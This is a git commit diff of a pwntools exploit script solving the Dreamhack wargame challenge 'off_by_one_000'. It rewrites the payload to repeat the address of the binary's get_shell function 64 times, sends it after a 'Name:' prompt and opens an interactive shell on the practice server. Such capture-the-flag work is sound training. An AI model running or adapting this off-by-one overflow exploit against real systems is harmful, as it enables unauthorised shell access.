0c3c135d84f66d415c9d10bf8c49ed2aa60c3f68
hogbal <hogbal31@gmail.com>
2020-07-24 01:21:35 -0700

    off_by_one_000

--- dreamhack.io/off_by_one_000/off_by_one_000.py
+++ dreamhack.io/off_by_one_000/off_by_one_000.py
@@ -1,16 +1,13 @@
 from pwn import *
 context.log_level='debug'
 
-n = remote('host1.dreamhack.games',8386)
+n = remote('host1.dreamhack.games',8398)
 elf = ELF('./off_by_one_000')
 
 get_shell = elf.symbols['get_shell']
 
-payload = b'A'*256
-payload += b'B'*4
-payload += p32(get_shell)
+payload = p32(get_shell)*64
 
-n.send(payload)
-
+n.sendafter('Name:',payload)
 
 n.interactive()
